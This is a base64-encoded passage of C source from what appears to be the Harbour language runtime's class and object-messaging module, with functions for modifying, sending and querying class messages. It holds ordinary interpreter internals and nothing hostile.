Cg0KDQogICAgICAgICAgICAgICAgICBoYl9hcnJheVNldCggcENsYXNzLT5wQ2xhc3NEYXRh
cywgcE1ldGgtPnVpRGF0YSwgcEluaXQgKTsNCiAgICAgICAgICAgICAgICAgIGhiX2l0ZW1S
ZWxlYXNlKHBJbml0KTsNCiAgICAgICAgICAgICAgICAgIHBNZXRoLT5iQ2xzRGF0YUluaXRp
YXRlZCA9IDE7DQogICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICBoYl9pdGVtQ2xl
YXIoICZpbml0ICk7DQogICAgICAgICAgICB9DQogICAgICAgICB9DQogICAgICB9DQogICB9
DQoNCiAgIHJldHVybiBwU2VsZjsNCn0NCg0KDQovKg0KICogX19jbHNNb2RNc2coIDxvT2Jq
PiwgPGNNZXNzYWdlPiwgPHBGdW5jPiApDQogKg0KICogTW9kaWZ5IG1lc3NhZ2UgKG9ubHkg
Zm9yIElOTElORSBhbmQgTUVUSE9EKQ0KICovDQpIQl9GVU5DKCBfX0NMU01PRE1TRyApDQp7
DQogICBVU0hPUlQgdWlDbGFzcyA9ICggVVNIT1JUICkgaGJfcGFybmkoIDEgKTsNCiAgIFBI
Ql9JVEVNIHBTdHJpbmcgPSBoYl9wYXJhbSggMiwgSEJfSVRfU1RSSU5HICk7DQoNCiAgIGlm
KCB1aUNsYXNzICYmIHVpQ2xhc3MgPD0gc191aUNsYXNzZXMgJiYgcFN0cmluZyApDQogICB7
DQogICAgICBQSEJfRFlOUyBwTXNnID0gaGJfZHluc3ltRmluZE5hbWUoIHBTdHJpbmctPml0
ZW0uYXNTdHJpbmcudmFsdWUgKTsNCg0KICAgICAgaWYoIHBNc2cgKQ0KICAgICAgew0KICAg
ICAgICAgUENMQVNTICAgcENsYXNzICAgPSBzX3BDbGFzc2VzICsgKCB1aUNsYXNzIC0gMSAp
Ow0KICAgICAgICAgVVNIT1JUICAgdWlBdCAgICAgPSAoIFVTSE9SVCApICggKCAoIGhiX2Ns
c19Nc2dUb051bSggcE1zZyApICkgJSBwQ2xhc3MtPnVpSGFzaEtleSApICogQlVDS0VUICk7
DQogICAgICAgICBVU0hPUlQgICB1aU1hc2sgICA9ICggVVNIT1JUICkgKCBwQ2xhc3MtPnVp
SGFzaEtleSAqIEJVQ0tFVCApOw0KICAgICAgICAgVVNIT1JUICAgdWlMaW1pdCAgPSAoIFVT
SE9SVCApICggdWlBdCA/ICggdWlBdCAtIDEgKSA6ICggdWlNYXNrIC0gMSApICk7DQoNCiAg
ICAgICAgIHdoaWxlKCAoIHVpQXQgIT0gdWlMaW1pdCApICYmDQogICAgICAgICAgICAgICAg
KCBwQ2xhc3MtPnBNZXRob2RzWyB1aUF0IF0ucE1lc3NhZ2UgJiYNCiAgICAgICAgICAgICAg
ICAoIHBDbGFzcy0+cE1ldGhvZHNbIHVpQXQgXS5wTWVzc2FnZSAhPSBwTXNnICkgKSApDQog
ICAgICAgICB7DQogICAgICAgICAgICB1aUF0Kys7DQogICAgICAgICAgICBpZiggdWlBdCA9
PSB1aU1hc2sgKQ0KICAgICAgICAgICAgICAgdWlBdCA9IDA7DQogICAgICAgICB9DQoNCiAg
ICAgICAgIGlmKCB1aUF0ICE9IHVpTGltaXQgKQ0KICAgICAgICAgeyAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgLyogUmVxdWVzdGVkIG1ldGhvZCBmb3VuZCAg
ICovDQogICAgICAgICAgICBQSEJfRlVOQyBwRnVuYyA9IHBDbGFzcy0+cE1ldGhvZHNbIHVp
QXQgXS5wRnVuY3Rpb247DQoNCiAgICAgICAgICAgIGlmKCBwRnVuYyA9PSBoYl9fX21zZ0V2
YWxJbmxpbmUgKSAgICAgIC8qIElOTElORSBtZXRob2QgY2hhbmdlZCAgICAqLw0KICAgICAg
ICAgICAgew0KICAgICAgICAgICAgICAgUEhCX0lURU0gcEJsb2NrID0gaGJfcGFyYW0oIDMs
IEhCX0lUX0JMT0NLICk7DQoNCiAgICAgICAgICAgICAgIGlmKCBwQmxvY2sgPT0gTlVMTCAp
DQogICAgICAgICAgICAgICAgICBoYl9lcnJSVF9CQVNFKCBFR19BUkcsIDMwMDAsIE5VTEws
ICJfX0NMU01PRE1TRyIgKTsNCiAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAg
ICAgIGhiX2FycmF5U2V0KCBwQ2xhc3MtPnBJbmxpbmVzLCBwQ2xhc3MtPnBNZXRob2RzWyB1
aUF0IF0udWlEYXRhLCBwQmxvY2sgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVs
c2UgaWYoICggcEZ1bmMgPT0gaGJfX19tc2dTZXREYXRhICkgfHwgKCBwRnVuYyA9PSBoYl9f
X21zZ0dldERhdGEgKSApDQogICAgICAgICAgICB7ICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAvKiBOb3QgYWxsb3dlZCBmb3IgREFUQSAgICAgKi8NCiAgICAgICAg
ICAgICAgIGhiX2VyclJUX0JBU0UoIEVHX0FSRywgMzAwNCwgIkNhbm5vdCBtb2RpZnkgYSBE
QVRBIGl0ZW0iLCAiX19DTFNNT0RNU0ciICk7DQogICAgICAgICAgICB9DQogICAgICAgICAg
ICBlbHNlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvKiBNb2RpZnkgTUVU
SE9EICAgICAgICAgICAgKi8NCiAgICAgICAgICAgICAgIHBDbGFzcy0+cE1ldGhvZHNbIHVp
QXQgXS5wRnVuY3Rpb24gPSAoIFBIQl9GVU5DICkgaGJfcGFybmwoIDMgKTsNCiAgICAgICAg
IH0NCiAgICAgIH0NCiAgIH0NCn0NCg0KDQovKg0KICogPGNDbGFzc05hbWU+IDo9IENsYXNz
TmFtZSggPGhDbGFzcz4gKQ0KICoNCiAqIFJldHVybnMgY2xhc3MgbmFtZSBvZiA8aENsYXNz
Pg0KICovDQpIQl9GVU5DKCBfX09CSkdFVENMU05BTUUgKQ0Kew0KICAgUEhCX0lURU0gcE9i
amVjdCA9IGhiX3BhcmFtKCAxLCBIQl9JVF9PQkpFQ1QgKTsNCiAgIFVTSE9SVCB1aUNsYXNz
Ow0KDQogICBpZiggcE9iamVjdCAmJiBwT2JqZWN0LT5pdGVtLmFzQXJyYXkudmFsdWUtPnVp
Q2xhc3MgKQ0KICAgew0KICAgICAgdWlDbGFzcyA9IHBPYmplY3QtPml0ZW0uYXNBcnJheS52
YWx1ZS0+dWlDbGFzczsNCg0KICAgICAgaGJfcmV0Yyggc19wQ2xhc3Nlc1sgdWlDbGFzcyAt
IDEgXS5zek5hbWUgKTsNCiAgIH0NCiAgIGVsc2UNCiAgIHsNCiAgICAgIHVpQ2xhc3MgPSAo
IFVTSE9SVCApIGhiX3Bhcm5pKCAxICk7DQoNCiAgICAgIGlmKCB1aUNsYXNzIDw9IHNfdWlD
bGFzc2VzICkNCiAgICAgICAgIGhiX3JldGMoIHNfcENsYXNzZXNbIHVpQ2xhc3MgLSAxIF0u
c3pOYW1lICk7DQogICAgICBlbHNlDQogICAgICAgICBoYl9yZXRjKCAiIiApOw0KICAgfQ0K
fQ0KDQoNCi8qDQogKiA8bFJldD4gOj0gX19vYmpIYXNNc2coIDxvT2JqPiwgPGNTeW1ib2w+
ICkNCiAqDQogKiBJcyA8Y1N5bWJvbD4gYSB2YWxpZCBtZXNzYWdlIGZvciB0aGUgPG9PYmo+
DQogKi8NCkhCX0ZVTkMoIF9fT0JKSEFTTVNHICkNCnsNCiAgIFBIQl9JVEVNIHBPYmplY3Qg
PSBoYl9wYXJhbSggMSwgSEJfSVRfT0JKRUNUICk7DQogICBQSEJfSVRFTSBwU3RyaW5nID0g
aGJfcGFyYW0oIDIsIEhCX0lUX1NUUklORyApOw0KDQogICBpZiggcE9iamVjdCAmJiBwU3Ry
aW5nICkNCiAgICAgIGhiX3JldGwoIGhiX29iakhhc01zZyggcE9iamVjdCwgcFN0cmluZy0+
aXRlbS5hc1N0cmluZy52YWx1ZSApICE9IDAgKTsNCiAgIGVsc2UNCiAgICAgIGhiX2VyclJU
X0JBU0UoIEVHX0FSRywgMzAwMCwgTlVMTCwgIl9fT0JKSEFTTVNHIiApOw0KfQ0KDQoNCi8q
DQogKiA8b05ldz4gOj0gX19vYmpDbG9uZSggPG9PbGQ+ICkNCiAqDQogKiBDbG9uZSBhbiBv
YmplY3QuIE5vdGUgdGhlIHNpbWlsYXJpdHkgd2l0aCBhQ2xvbmUgOy0pDQogKi8NCkhCX0ZV
TkMoIF9fT0JKQ0xPTkUgKQ0Kew0KICAgUEhCX0lURU0gcFNyY09iamVjdCA9IGhiX3BhcmFt
KCAxLCBIQl9JVF9PQkpFQ1QgKTsNCg0KICAgaWYoIHBTcmNPYmplY3QgKQ0KICAgICAgaGJf
aXRlbVJlbGVhc2UoIGhiX2l0ZW1SZXR1cm4oIGhiX2FycmF5Q2xvbmUoIHBTcmNPYmplY3Qg
KSApICk7DQogICBlbHNlDQogICAgICBoYl9lcnJSVF9CQVNFKCBFR19BUkcsIDMwMDEsIE5V
TEwsICJfX09CSkNMT05FIiApOw0KfQ0KDQoNCi8qDQogKiA8eFJldD4gPSBfX29ialNlbmRN
c2coIDxvT2JqPiwgPGNTeW1ib2w+LCA8eEFyZywuLj4NCiAqDQogKiBTZW5kIGEgbWVzc2Fn
ZSB0byBhbiBvYmplY3QNCiAqLw0KSEJfRlVOQyggX19PQkpTRU5ETVNHICkNCnsNCiAgIFBI
Ql9JVEVNIHBPYmplY3QgID0gaGJfcGFyYW0oIDEsIEhCX0lUX09CSkVDVCApOw0KICAgUEhC
X0lURU0gcE1lc3NhZ2UgPSBoYl9wYXJhbSggMiwgSEJfSVRfU1RSSU5HICk7DQoNCiAgIGlm
KCBwTWVzc2FnZSAmJiBwT2JqZWN0ICkgICAgICAgICAgICAgICAgLyogT2JqZWN0ICYgbWVz
c2FnZSBwYXNzZWQgICAgICAqLw0KICAgew0KICAgICAgUEhCX0RZTlMgcE1zZyA9IGhiX2R5
bnN5bUZpbmROYW1lKCBwTWVzc2FnZS0+aXRlbS5hc1N0cmluZy52YWx1ZSApOw0KDQogICAg
ICBpZiggcE1zZyApDQogICAgICB7DQogICAgICAgICBVU0hPUlQgdWlQYXJhbTsNCg0KICAg
ICAgICAgaGJfdm1QdXNoKCBwT2JqZWN0ICk7ICAgICAgICAgICAgICAgICAgICAgIC8qIFB1
c2ggb2JqZWN0ICAgICAgICAgICAgICAgICAgKi8NCiAgICAgICAgIGhiX3ZtTWVzc2FnZSgg
cE1zZy0+cFN5bWJvbCApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAvKiBQdXNoIGNoYXIgc3ltYm9sIGFzIG1lc3NhZ2UgICovDQogICAgICAgICBm
b3IoIHVpUGFyYW0gPSAzOyB1aVBhcmFtIDw9IGhiX3Bjb3VudCgpOyB1aVBhcmFtKysgKSAg
IC8qIFB1c2ggYXJndW1lbnRzIG9uIHN0YWNrICAgICAgKi8NCiAgICAgICAgICAgIGhiX3Zt
UHVzaCggaGJfcGFyYW0oIHVpUGFyYW0sIEhCX0lUX0FOWSApICk7DQogICAgICAgICBoYl92
bURvKCAoIFVTSE9SVCApICggaGJfcGNvdW50KCkgLSAyICkgKTsgICAgICAgICAgICAgLyog
RXhlY3V0ZSBtZXNzYWdlICAgICAgICAgICAgICAqLw0KICAgICAgfQ0KICAgfQ0KICAgZWxz
ZQ0KICAgICAgaGJfZXJyUlRfQkFTRSggRUdfQVJHLCAzMDAwLCBOVUxMLCAiX19PQkpTRU5E
TVNHIiApOw0KfQ0KDQoNCi8qDQogKiA8aENsYXNzPiA6PSBfX2Nsc0luc3RTdXBlciggPGNO
YW1lPiApDQogKg0KICogSW5zdGFuY2Ugc3VwZXIgY2xhc3MgYW5kIHJldHVybiBjbGFzcyBo
YW5kbGUNCiAqLw0KSEJfRlVOQyggX19DTFNJTlNUU1VQRVIgKQ0Kew0KICAgY2hhciBjU3Ry
aW5nWyBIQl9TWU1CT0xfTkFNRV9MRU4gKyAxIF0gOw0KICAgLypQSEJfSVRFTSBwU3RyaW5n
ID0gaGJfcGFyYW0oIDEsIEhCX0lUX1NUUklORyApOyAqLw0KICAgQk9PTCBiRm91bmQgPSBG
QUxTRTsNCg0KICAgc3RyY3B5KCAmY1N0cmluZywgaGJfcGFyYygxKSApOw0KDQogICBpZigg
LypwU3RyaW5nKi8gaGJfcGNvdW50KCkgPj0gMSApDQogICB7DQogICAgICBQSEJfRFlOUyBw
RHluU3ltID0gaGJfZHluc3ltRmluZCggY1N0cmluZyAvKnBTdHJpbmctPml0ZW0uYXNTdHJp
bmcudmFsdWUqLyApOw0KDQogICAgICBpZiggcER5blN5bSApICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAvKiBGaW5kIGZ1bmN0aW9uICAgICAgICAgICAgKi8NCiAgICAgIHsNCiAg
ICAgICAgIFVTSE9SVCB1aUNsYXNzOw0KDQogICAgICAgICBoYl92bVB1c2hTeW1ib2woIHBE
eW5TeW0tPnBTeW1ib2wgKTsgICAgICAgIC8qIFB1c2ggZnVuY3Rpb24gbmFtZSAgICAgICAq
Lw0KICAgICAgICAgaGJfdm1QdXNoTmlsKCk7DQogICAgICAgICBoYl92bUZ1bmN0aW9uKCAw
ICk7ICAgICAgICAgICAgICAgICAgICAgICAgIC8qIEV4ZWN1dGUgc3VwZXIgY2xhc3MgICAg
ICAqLw0KDQogICAgICAgICBpZiggSEJfSVNfT0JKRUNUKCAmaGJfc3RhY2suUmV0dXJuICkg
KQ0KICAgICAgICAgew0KICAgICAgICAgICAgZm9yKCB1aUNsYXNzID0gMDsgISBiRm91bmQg
JiYgdWlDbGFzcyA8IHNfdWlDbGFzc2VzOyB1aUNsYXNzKysgKQ0KICAgICAgICAgICAgeyAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyogTG9jYXRlIHRoZSBlbnRy
eSAgICAgICAgICovDQogICAgICAgICAgICAgICBpZiggaGJfc3RyaWNtcCggLypwU3RyaW5n
LT5pdGVtLmFzU3RyaW5nLnZhbHVlKi8gY1N0cmluZyAsIHNfcENsYXNzZXNbIHVpQ2xhc3Mg
XS5zek5hbWUgKSA9PSAwICkNCiAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAg
IGhiX3JldG5pKCB1aUNsYXNzICsgMSApOyAgICAgICAgICAgICAgIC8qIEVudHJ5ICsgMSA9
IGhiX19fbXNnQ2xzSCAgICAqLw0KICAgICAgICAgICAgICAgICAgYkZvdW5kID0gVFJVRTsN
CiAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgIH0NCiAgICAgICAg
IGVsc2UNCiAgICAgICAgICAgIGhiX2VyclJUX0JBU0UoIEVHX0FSRywgMzAwMiwgIlN1cGVy
IGNsYXNzIGRvZXMgbm90IHJldHVybiBhbiBvYmplY3QiLCAiX19DTFNJTlNUU1VQRVIiICk7
DQogICAgICB9DQogICAgICBlbHNlDQogICAgICAgICBoYl9lcnJSVF9CQVNFKCBFR19BUkcs
IDMwMDMsICJDYW5ub3QgZmluZCBzdXBlciBjbGFzcyIsICJfX0NMU0lOU1RTVVBFUiIgKTsN
CiAgIH0NCg0KICAgaWYoICEgYkZvdW5kICkNCiAgICAgIGhiX3JldG5pKCAwICk7DQp9DQoN
Cg0KDQovKg0KICogPG5TZXE+ID0gX19jbHNfQ250Q2xzRGF0YSggPGhDbGFzcz4gKQ0KICoN
CiAqIFJldHVybiBudW1iZXIgb2YgY2xhc3MgZGF0YXMNCiAqLw0KSEJfRlVOQyggX19DTFNf
Q05UQ0xTREFUQSApDQp7DQogICBVU0hPUlQgdWlDbGFzcyA9ICggVVNIT1JUICkgaGJfcGFy
bmkoIDEgKTsNCg0KICAgaWYoIHVpQ2xhc3MgKQ0KICAgew0KICAgICAgUENMQVNTIHBDbGFz
cyA9IHNfcENsYXNzZXMgKyAoIHVpQ2xhc3MgLSAxICk7DQogICAgICBoYl9yZXRuaSggaGJf
YXJyYXlMZW4oIHBDbGFzcy0+cENsYXNzRGF0YXMgKSApOw0KICAgfQ0KICAgZWxzZSBoYl9y
ZXRuaSggMCApOw0KfQ0KDQoNCi8qDQogKiA8blNlcT4gPSBfX2Nsc19DbnREYXRhKCA8aENs
YXNzPiApDQogKg0KICogUmV0dXJuIG51bWJlciBvZiBkYXRhcw0KICovDQpIQl9GVU5DKCBf
X0NMU19DTlREQVRBICkNCnsNCiAgIFVTSE9SVCB1aUNsYXNzID0gKCBVU0hPUlQgKSBoYl9w
YXJuaSggMSApOw0KDQogICBpZiggdWlDbGFzcyApDQogICAgICBoYl9yZXRuaSggdWlDbGFz
cyAhPSAwID8gc19wQ2xhc3Nlc1sgdWlDbGFzcyAtIDEgXS51aURhdGFzIDogMCApOw0KfQ0K
DQoNCi8qDQogKiA8blNlcT4gPSBfX2Nsc19EZWNEYXRhKCA8aENsYXNzPiApDQogKg0KICog
UmV0dXJuIG51bWJlciBvZiBkYXRhcyBhbmQgZGVjcmVhc2UNCiAqLw0KSEJfRlVOQyggX19D
TFNfREVDREFUQSApDQp7DQogICBVU0hPUlQgdWlDbGFzcyA9ICggVVNIT1JUICkgaGJfcGFy
bmkoIDEgKTsNCg0KICAgaWYoIHVpQ2xhc3MgKQ0KICAgICAgaGJfcmV0bmkoIHNfcENsYXNz
ZXNbIHVpQ2xhc3MgLSAxIF0udWlEYXRhcy0tICk7DQp9DQoNCg0KLyoNCiAqIDxuU2VxPiA9
IF9fY2xzX0luY0RhdGEoIDxoQ2xhc3M+ICkNCiAqDQogKiBSZXR1cm4gbnVtYmVyIG9mIGRh
dGFzIGFuZCBpbmNyZWFzZQ0KICovDQpIQl9GVU5DKCBfX0NMU19JTkNEQVRBICkNCnsNCiAg
IFVTSE9SVCB1aUNsYXNzID0gKCBVU0hPUlQgKSBoYl9wYXJuaSggMSApOw0KDQogICBpZigg
dWlDbGFzcyApDQogICAgICBoYl9yZXRuaSggdWlDbGFzcyAhPSAwID8gKytzX3BDbGFzc2Vz
WyB1aUNsYXNzIC0gMSBdLnVpRGF0YXMgOiAwICk7DQp9DQoNCi8qIE5PVEU6IFVuZG9jdW1l
bnRlZCBDbGlwcGVyIGZ1bmN0aW9uICovDQoNCkhCX0ZVTkMoIF9fQ0xBU1NORVcgKQ0Kew0K
ICAgSEJfRlVOQ05BTUUoIF9fQ0xTTkVXICkoKTsNCn0NCg0KLyogTk9URTogVW5kb2N1bWVu
dGVkIENsaXBwZXIgZnVuY3Rpb24gKi8NCg0KSEJfRlVOQyggX19DTEFTU0lOU1RBTkNFICkN
CnsNCiAgIEhCX0ZVTkNOQU1FKCBfX0NMU0lOU1QgKSgpOw0KfQ0KDQovKiBOT1RFOiBVbmRv
Y3VtZW50ZWQgQ2xpcHBlciBmdW5jdGlvbiAqLw0KDQpIQl9GVU5DKCBfX0NMQVNTQUREICkN
CnsNCiAgIEhCX0ZVTkNOQU1FKCBfX0NMU0FERE1TRyApKCk7DQp9DQoNCi8qIE5PVEU6IFVu
ZG9jdW1lbnRlZCBDbGlwcGVyIGZ1bmN0aW9uICovDQoNCkhCX0ZVTkMoIF9fQ0xBU1NOQU1F
ICkNCnsNCiAgIEhCX0ZVTkNOQU1FKCBfX09CSkdFVENMU05BTUUgKSgpOw0KfQ0KDQovKiBO
T1RFOiBVbmRvY3VtZW50ZWQgQ2xpcHBlciBmdW5jdGlvbiAqLw0KLyogTk9URTogQmFzZWQg
b24gaGJfX19tc2dDbHNTZWwoKSAqLw0KDQpIQl9GVU5DKCBfX0NMQVNTU0VMICkNCnsNCiAg
IFVTSE9SVCB1aUNsYXNzID0gKCBVU0hPUlQgKSBoYl9wYXJuaSggMSApOw0KICAgUEhCX0lU
RU0gcFJldHVybiA9IGhiX2l0ZW1OZXcoIE5VTEwgKTsNCg0KICAgaWYoIHVpQ2xhc3MgJiYg
dWlDbGFzcyA8PSBzX3VpQ2xhc3NlcyApDQogICB7DQogICAgICBQQ0xBU1MgcENsYXNzID0g
c19wQ2xhc3NlcyArICggdWlDbGFzcyAtIDEgKTsNCiAgICAgIFVTSE9SVCB1aUxpbWl0ID0g
KCBVU0hPUlQgKSAoIHBDbGFzcy0+dWlIYXNoS2V5ICogQlVDS0VUICk7IC8qIE51bWJlciBv
ZiBIYXNoIGtleXMgICAgICAqLw0KICAgICAgVVNIT1JUIHVpUG9zID0gMDsNCiAgICAgIFVT
SE9SVCB1aUF0Ow0KDQogICAgICBoYl9pdGVtUmVsZWFzZSggcFJldHVybiApOw0KICAgICAg
cFJldHVybiA9IGhiX2l0ZW1BcnJheU5ldyggcENsYXNzLT51aU1ldGhvZHMgKTsNCiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIENyZWF0ZSBh
IHRyYW5zZmVyIGFycmF5ICAqLw0KICAgICAgZm9yKCB1aUF0ID0gMDsgdWlBdCA8IHVpTGlt
aXQ7IHVpQXQrKyApDQogICAgICB7DQogICAgICAgICBQSEJfRFlOUyBwTWVzc2FnZSA9ICgg
UEhCX0RZTlMgKSBwQ2xhc3MtPnBNZXRob2RzWyB1aUF0IF0ucE1lc3NhZ2U7DQogICAgICAg
ICBpZiggcE1lc3NhZ2UgKSAgICAgICAgICAgICAgICAgICAgICAgICAvKiBIYXNoIEVudHJ5
IHVzZWQgPyAgICAgICAgKi8NCiAgICAgICAgIHsNCiAgICAgICAgICAgIFBIQl9JVEVNIHBJ
dGVtID0gaGJfaXRlbVB1dEMoIE5VTEwsIHBNZXNzYWdlLT5wU3ltYm9sLT5zek5hbWUgKTsN
CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIEFk
ZCB0byBhcnJheSAgICAgICAgICAgICAqLw0KICAgICAgICAgICAgaGJfaXRlbUFycmF5UHV0
KCBwUmV0dXJuLCArK3VpUG9zLCBwSXRlbSApOw0KICAgICAgICAgICAgaGJfaXRlbVJlbGVh
c2UoIHBJdGVtICk7DQogICAgICAgICB9DQogICAgICB9DQogICB9DQoNCiAgIGhiX2l0ZW1S
ZWxlYXNlKCBoYl9pdGVtUmV0dXJuKCBwUmV0dXJuICkgKTsNCn0NCg0KLyogdG8gYmUgdXNl
ZCBmcm9tIENsYXNzZXMgRVJST1IgSEFORExFUiBtZXRob2QgKi8NCkhCX0ZVTkMoIF9fR0VU
TUVTU0FHRSApDQp7DQogICBQSEJfSVRFTSBwQmFzZSA9IGhiX3N0YWNrLnBCYXNlOw0KDQog
ICBwQmFzZSA9IGhiX3N0YWNrLnBJdGVtcyArIHBCYXNlLT5pdGVtLmFzU3ltYm9sLnN0YWNr
YmFzZTsNCg0KICAgaGJfcmV0YyggcEJhc2UtPml0ZW0uYXNTeW1ib2wudmFsdWUtPnN6TmFt
ZSApOw0KfQ0KDQpIQl9GVU5DKCBfX0NMU1BBUkVOVCApDQp7DQogICBoYl9yZXRsKCBoYl9j
bHNJc1BhcmVudCggc19wQ2xhc3NlcyArICggaGJfcGFybmkoIDEgKSAtIDEgKSwgaGJfcGFy
YyggMiApICkgKTsNCn0NCg0KSEJfRlVOQyggX19TRU5ERVIgKQ0Kew0KICAgUEhCX0lURU0g
cEJhc2UgPSBoYl9zdGFjay5wQmFzZTsNCiAgIFBIQl9JVEVNIG9TZW5kZXIgPSBOVUxMOw0K
ICAgVVNIT1JUIGlMZXZlbCA9IDM7DQoNCiAgIHdoaWxlKCBpTGV2ZWwgPiAwICYmIHBCYXNl
ICE9IGhiX3N0YWNrLnBJdGVtcyApDQogICB7DQogICAgICBwQmFzZSA9IGhiX3N0YWNrLnBJ
dGVtcyArIHBCYXNlLT5pdGVtLmFzU3ltYm9sLnN0YWNrYmFzZTsNCiAgICAgIG9TZW5kZXIg
PSBwQmFzZSArIDE7DQoNCiAgICAgIGlmKCAoIGlMZXZlbC0tID09IDIgJiYgb1NlbmRlci0+
dHlwZSAhPSBIQl9JVF9CTE9DSyApIHx8ICggb1NlbmRlciApLT50eXBlID09IEhCX0lUX05J
TCApDQogICAgICAgICBicmVhazsNCiAgIH0NCg0KICAgaWYoIGlMZXZlbCA9PSAwICYmIG9T
ZW5kZXIgIT0gTlVMTCAmJiBvU2VuZGVyLT50eXBlID09IEhCX0lUX09CSkVDVCApDQogICAg
ICBoYl9pdGVtUmV0dXJuKCBvU2VuZGVyICk7DQp9DQoNCi8qDQogKiBBZGRlZCBieSBS4kMm
SmZMDQogKg0KICogYmFzZWQgb24gaGJfX19tc2dDbHNIKCB2b2lkICkNCiAqLw0KSEJfRlVO
QyggX19DTEFTU0ggKQ0Kew0KICAgUEhCX0lURU0gcE9iamVjdCA9IGhiX2l0ZW1QYXJhbSgg
MSApOw0KDQogICBoYl9yZXRuaSggSEJfSVNfT0JKRUNUKCBwT2JqZWN0ICkgPyBwT2JqZWN0
LT5pdGVtLmFzQXJyYXkudmFsdWUtPnVpQ2xhc3MgOiAwICk7DQoNCiAgIGhiX2l0ZW1SZWxl
YXNlKCBwT2JqZWN0ICk7DQp9DQoNCi8qIFdvcmsgaW4gcHJvZ3Jlc3MuDQogKiBBZGRlZCBi
eSBS4kMmSmZMDQogKg0KICogYmFzZWQgb24gaGJfX19tc2dFdmFsKCB2b2lkICkNCiAqLw0K
SEJfRlVOQyggX19FVkFMICkNCnsNCiAgIFBIQl9JVEVNIHBPYmplY3QgPSBoYl9pdGVtUGFy
YW0oIDEgKTsNCg0KICAgaWYoIEhCX0lTX0JMT0NLKCBwT2JqZWN0ICkgKQ0KICAgew0KICAg
ICAgVVNIT1JUIHVpUGFyYW07DQoNCiAgICAgIGhiX3ZtUHVzaFN5bWJvbCggJmhiX3N5bUV2
YWwgKTsNCiAgICAgIGhiX3ZtUHVzaCggcE9iamVjdCApOyAgICAgICAgICAgICAgICAgICAg
IC8qIFB1c2ggYmxvY2sgICAgICAgICAgICAgICAqLw0KICAgICAgZm9yKCB1aVBhcmFtID0g
MTsgdWlQYXJhbSA8PSBoYl9wY291bnQoKTsgdWlQYXJhbSsrICkNCiAgICAgICAgIGhiX3Zt
UHVzaCggaGJfcGFyYW0oIHVpUGFyYW0sIEhCX0lUX0FOWSApICk7DQogICAgICBoYl92bURv
KCAoIFVTSE9SVCApIGhiX3Bjb3VudCgpICk7ICAgICAgICAgICAgICAgICAgICAgICAvKiBT
ZWxmIGlzIGFsc28gYW4gYXJndW1lbnQgKi8NCiAgIH0NCiAgIGVsc2UNCiAgICAgIGhiX2Vy
clJUX0JBU0VfU3Vic3RSKCBFR19OT01FVEhPRCwgMTAwNCwgTlVMTCwgIkVWQUwiICk7DQp9
DQoNCi8qID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PSAqLw0KDQovKg0KICogPGhDbGFzcz4gOj0gPG9iaj46Q2xhc3NIKCkNCiAqDQogKiBSZXR1
cm5zIGNsYXNzIGhhbmRsZSBvZiA8b2JqPg0KICovDQpzdGF0aWMgSEFSQk9VUiBoYl9fX21z
Z0Nsc0goIHZvaWQgKQ0Kew0KICAgaWYoIEhCX0lTX0FSUkFZKCBoYl9zdGFjay5wQmFzZSAr
IDEgKSApDQogICAgICBoYl9yZXRuaSggKCBoYl9zdGFjay5wQmFzZSArIDEgKS0+aXRlbS5h
c0FycmF5LnZhbHVlLT51aUNsYXNzICk7DQogICBlbHNlDQogICAgICBoYl9yZXRuaSggMCAp
Ow0KfQ0KDQoNCi8qIEFkZGVkIGJ5IEpmTCZSYUMNCiAqIDxsb2dpY2FsPiA8PSA8b2JqPjpJ
c0Rlcml2ZWRGcm9tKCB4UGFyYW0gKQ0KICoNCiAqIFJldHVybiB0cnVlIGlmIDxvYmo+IGlz
IGRlcml2ZWQgZnJvbSB4UGFyYW0uDQogKiB4UGFyYW0gY2FuIGJlIGVpdGhlciBhbiBvYmog
b3IgYSBjbGFzc25hbWUNCiAqLw0Kc3RhdGljIEhBUkJPVVIgaGJfX19tc2dDbHNQYXJlbnQo
IHZvaWQgKQ0Kew0KICAgUEhCX0lURU0gcEl0ZW1SZWY7DQogICBQSEJfSVRFTSBwSXRlbVBh
cmFtOw0KICAgUENMQVNTIHBDbGFzczsNCiAgIGNoYXIgKiBzelBhcmVudE5hbWUgPSAwOw0K
ICAgVVNIT1JUIHVpQ2xhc3MsIGk7DQoNCiAgIGlmKCBIQl9JU19CWVJFRiggaGJfc3RhY2su
cEJhc2UgKyAxICkgKSAgICAgICAgICAgIC8qIFZhcmlhYmxlcyBieSByZWZlcmVuY2UgICAq
Lw0KICAgICAgcEl0ZW1SZWYgPSBoYl9pdGVtVW5SZWYoIGhiX3N0YWNrLnBCYXNlICsgMSAp
Ow0KICAgZWxzZQ0KICAgICAgcEl0ZW1SZWYgPSBoYl9zdGFjay5wQmFzZSArIDE7DQoNCiAg
IHVpQ2xhc3MgPSBwSXRlbVJlZi0+aXRlbS5hc0FycmF5LnZhbHVlLT51aUNsYXNzOw0KDQog
ICBwQ2xhc3MgPSBzX3BDbGFzc2VzICsgKCB1aUNsYXNzIC0gMSApOw0KDQogICBwSXRlbVBh
cmFtID0gaGJfc3RhY2sucEJhc2UgKyAyOw0KDQogICBpZiggSEJfSVNfT0JKRUNUKCBwSXRl
bVBhcmFtICkgKQ0KICAgICAgc3pQYXJlbnROYW1lID0gaGJfb2JqR2V0Q2xzTmFtZSggcEl0
ZW1QYXJhbSApOw0KICAgZWxzZSBpZiggSEJfSVNfU1RSSU5HKCBwSXRlbVBhcmFtICkgKQ0K
ICAgICAgc3pQYXJlbnROYW1lID0gaGJfaXRlbUdldEMoIHBJdGVtUGFyYW0gKTsNCg0KICAg
